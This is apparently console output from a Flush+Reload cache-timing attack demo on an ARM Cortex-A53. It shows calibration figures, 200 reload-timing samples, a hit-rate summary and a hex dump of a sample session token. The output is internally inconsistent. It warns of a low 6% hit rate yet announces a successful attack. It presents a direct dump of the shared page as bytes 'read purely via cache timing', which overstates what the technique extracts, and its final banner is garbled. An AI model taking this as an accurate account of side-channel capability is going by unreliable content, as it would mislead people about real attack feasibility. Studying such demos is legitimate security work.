╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffff9d66a000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    135 ns  (line already in cache)
[attacker]   DRAM miss     =   2074 ns  (line not in cache)
[attacker]   Threshold     =   1104 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2343        miss      0 hits so far  (warmup)
  2       1718        miss      0 hits so far  (warmup)
  3       2395        miss      0 hits so far  (warmup)
  4       1927        miss      0 hits so far  (warmup)
  5       2291        miss      0 hits so far  (warmup)
  6       1822        miss      0 hits so far  (warmup)
  7       2760        miss      0 hits so far  (warmup)
  8       1979        miss      0 hits so far  (warmup)
  9       1822        miss      0 hits so far  (warmup)
  10      1822        miss      0 hits so far  (warmup)
  11      2291        miss      0 hits so far
  12      2135        miss      0 hits so far
  13      2343        miss      0 hits so far
  14      2343        miss      0 hits so far
  15      2239        miss      0 hits so far
  16      1822        miss      0 hits so far
  17      1770        miss      0 hits so far
  18      1458        miss      0 hits so far
  19      2656        miss      0 hits so far
  20      1770        miss      0 hits so far
  21      1875        miss      0 hits so far
  22      1458        miss      0 hits so far
  23      1250        miss      0 hits so far
  24      1510        miss      0 hits so far
  25      1562        miss      0 hits so far
  26      1302        miss      0 hits so far
  27      2500        miss      0 hits so far
  28      2760        miss      0 hits so far
  29      1250        miss      0 hits so far
  30      1562        miss      0 hits so far
  31      1406        miss      0 hits so far
  32      1145        miss      0 hits so far
  33      1302        miss      0 hits so far
  34      1562        miss      0 hits so far
  35      2656        miss      0 hits so far
  36      1718        miss      0 hits so far
  37      989         HIT ◄   1 hits so far
  38      1250        miss      1 hits so far
  39      1197        miss      1 hits so far
  40      1614        miss      1 hits so far
  41      1822        miss      1 hits so far
  42      1145        miss      1 hits so far
  43      2291        miss      1 hits so far
  44      1875        miss      1 hits so far
  45      1145        miss      1 hits so far
  46      2083        miss      1 hits so far
  47      1302        miss      1 hits so far
  48      1302        miss      1 hits so far
  49      1979        miss      1 hits so far
  50      1718        miss      1 hits so far
  51      2864        miss      1 hits so far
  52      2187        miss      1 hits so far
  53      2083        miss      1 hits so far
  54      885         HIT ◄   2 hits so far
  55      2500        miss      2 hits so far
  56      1302        miss      2 hits so far
  57      1458        miss      2 hits so far
  58      1093        HIT ◄   3 hits so far
  59      1250        miss      3 hits so far
  60      2916        miss      3 hits so far
  61      1822        miss      3 hits so far
  62      2604        miss      3 hits so far
  63      2864        miss      3 hits so far
  64      2500        miss      3 hits so far
  65      1979        miss      3 hits so far
  66      2135        miss      3 hits so far
  67      1666        miss      3 hits so far
  68      2395        miss      3 hits so far
  69      2343        miss      3 hits so far
  70      2343        miss      3 hits so far
  71      1927        miss      3 hits so far
  72      1875        miss      3 hits so far
  73      2083        miss      3 hits so far
  74      1875        miss      3 hits so far
  75      2343        miss      3 hits so far
  76      2083        miss      3 hits so far
  77      2395        miss      3 hits so far
  78      2187        miss      3 hits so far
  79      2083        miss      3 hits so far
  80      2447        miss      3 hits so far
  81      2708        miss      3 hits so far
  82      1666        miss      3 hits so far
  83      1822        miss      3 hits so far
  84      2343        miss      3 hits so far
  85      1770        miss      3 hits so far
  86      2187        miss      3 hits so far
  87      2760        miss      3 hits so far
  88      1770        miss      3 hits so far
  89      1822        miss      3 hits so far
  90      1875        miss      3 hits so far
  91      1302        miss      3 hits so far
  92      2343        miss      3 hits so far
  93      2968        miss      3 hits so far
  94      1875        miss      3 hits so far
  95      2031        miss      3 hits so far
  96      1458        miss      3 hits so far
  97      1041        HIT ◄   4 hits so far
  98      1093        HIT ◄   5 hits so far
  99      1458        miss      5 hits so far
  100     2187        miss      5 hits so far
  101     2239        miss      5 hits so far
  102     1093        HIT ◄   6 hits so far
  103     2864        miss      6 hits so far
  104     2135        miss      6 hits so far
  105     1718        miss      6 hits so far
  106     2031        miss      6 hits so far
  107     2135        miss      6 hits so far
  108     3385        miss      6 hits so far
  109     3072        miss      6 hits so far
  110     2187        miss      6 hits so far
  111     2239        miss      6 hits so far
  112     2083        miss      6 hits so far
  113     1927        miss      6 hits so far
  114     1979        miss      6 hits so far
  115     1197        miss      6 hits so far
  116     2500        miss      6 hits so far
  117     1770        miss      6 hits so far
  118     1666        miss      6 hits so far
  119     1458        miss      6 hits so far
  120     1302        miss      6 hits so far
  121     1406        miss      6 hits so far
  122     1822        miss      6 hits so far
  123     1354        miss      6 hits so far
  124     2447        miss      6 hits so far
  125     1510        miss      6 hits so far
  126     1302        miss      6 hits so far
  127     1041        HIT ◄   7 hits so far
  128     2031        miss      7 hits so far
  129     2083        miss      7 hits so far
  130     1822        miss      7 hits so far
  131     1406        miss      7 hits so far
  132     1354        miss      7 hits so far
  133     2500        miss      7 hits so far
  134     2239        miss      7 hits so far
  135     1562        miss      7 hits so far
  136     2239        miss      7 hits so far
  137     1666        miss      7 hits so far
  138     1770        miss      7 hits so far
  139     1302        miss      7 hits so far
  140     1145        miss      7 hits so far
  141     3072        miss      7 hits so far
  142     1666        miss      7 hits so far
  143     2083        miss      7 hits so far
  144     2343        miss      7 hits so far
  145     2239        miss      7 hits so far
  146     1145        miss      7 hits so far
  147     1197        miss      7 hits so far
  148     989         HIT ◄   8 hits so far
  149     2760        miss      8 hits so far
  150     2187        miss      8 hits so far
  151     1458        miss      8 hits so far
  152     1562        miss      8 hits so far
  153     1458        miss      8 hits so far
  154     2656        miss      8 hits so far
  155     1302        miss      8 hits so far
  156     1354        miss      8 hits so far
  157     2916        miss      8 hits so far
  158     1614        miss      8 hits so far
  159     2135        miss      8 hits so far
  160     2083        miss      8 hits so far
  161     1927        miss      8 hits so far
  162     1354        miss      8 hits so far
  163     989         HIT ◄   9 hits so far
  164     1145        miss      9 hits so far
  165     2291        miss      9 hits so far
  166     1354        miss      9 hits so far
  167     2552        miss      9 hits so far
  168     1718        miss      9 hits so far
  169     1145        miss      9 hits so far
  170     1718        miss      9 hits so far
  171     1458        miss      9 hits so far
  172     1406        miss      9 hits so far
  173     2291        miss      9 hits so far
  174     1614        miss      9 hits so far
  175     1510        miss      9 hits so far
  176     989         HIT ◄   10 hits so far
  177     2760        miss      10 hits so far
  178     1822        miss      10 hits so far
  179     1250        miss      10 hits so far
  180     2135        miss      10 hits so far
  181     1406        miss      10 hits so far
  182     1614        miss      10 hits so far
  183     2031        miss      10 hits so far
  184     3697        miss      10 hits so far
  185     1510        miss      10 hits so far
  186     1354        miss      10 hits so far
  187     1927        miss      10 hits so far
  188     1614        miss      10 hits so far
  189     1145        miss      10 hits so far
  190     2239        miss      10 hits so far
  191     1979        miss      10 hits so far
  192     2239        miss      10 hits so far
  193     2760        miss      10 hits so far
  194     2864        miss      10 hits so far
  195     1510        miss      10 hits so far
  196     2343        miss      10 hits so far
  197     1354        miss      10 hits so far
  198     1197        miss      10 hits so far
  199     1041        HIT ◄   11 hits so far
  200     1041        HIT ◄   12 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 12 / 190  (6%)
  Average reload time: 1862 ns
  Threshold          : 1104 ns
  Verdict            : Low hit rate — check timing / CPU pinning.

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 33 30  38 35 20 7c 20 69 74 65  │ 1781303085 | ite ║
  ║  0050   72 3d 31 38 33 00 00 00  00 00 00 00 00 00 00 00  │ r=183........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 12                                  ║
  ║  Hit rate              : 6                                  %║
  ║  Average reload time   : 1862                              ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781303085 | iter=183                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
